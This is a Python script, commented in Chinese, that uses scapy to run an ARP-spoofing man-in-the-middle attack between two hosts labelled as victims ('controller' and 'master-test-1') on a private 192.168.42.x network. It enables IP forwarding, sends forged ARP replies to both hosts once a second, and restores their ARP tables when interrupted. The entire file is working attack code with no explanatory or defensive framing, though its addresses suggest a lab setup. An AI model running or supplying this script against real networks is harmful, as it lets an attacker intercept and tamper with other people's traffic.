import scapy.all as scapy
import time
import subprocess
import os

def get_mac(ip):
    """查询本地ARP或发送ARP请求获取MAC地址"""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def send_arp_spoof(target_ip, spoof_ip, iface):
    """构建并发送伪造的ARP reply包"""
    target_mac = get_mac(target_ip)
    
    if target_mac is None:
        print(f"[-] 无法获取 {target_ip} 的MAC地址")
        return
    
    # 构建ARP reply包：声称spoof_ip的MAC是本机MAC
    arp_response = scapy.ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, iface=iface, verbose=False)

def restore_arp(target_ip, source_ip, iface):
    """恢复原始ARP映射"""
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    
    if target_mac and source_mac:
        arp_restore = scapy.ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(arp_restore, iface=iface, verbose=True, count=5)
        print(f"[+] ARP表已恢复")

def main():
    # 配置变量
    iface = "eth0"  # 网络接口
    attacker_ip = "192.168.42.132"  # 攻击者IP
    victim1_ip = "192.168.42.133"   # 受害者1 (controller)
    victim2_ip = "192.168.42.128"   # 受害者2 (master-test-1)
    
    print("[*] 启动ARP中间人攻击")
    print(f"[*] 受害者1: {victim1_ip}")
    print(f"[*] 受害者2: {victim2_ip}")
    
    # 启用IP转发
    try:
        subprocess.run(["sudo", "sysctl", "-w", "net.inet.ip.forwarding=1"], check=True)
        print("[+] IP转发已启用")
    except Exception as e:
        print(f"[-] 启用IP转发失败: {e}")
    
    try:
        while True:
            send_arp_spoof(victim1_ip, victim2_ip, iface)  # 欺骗victim1
            send_arp_spoof(victim2_ip, victim1_ip, iface)  # 欺骗victim2
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] 正在清理...")
        restore_arp(victim1_ip, victim2_ip, iface)
        restore_arp(victim2_ip, victim1_ip, iface)
        print("[+] 攻击已停止")

if __name__ == '__main__':
    main()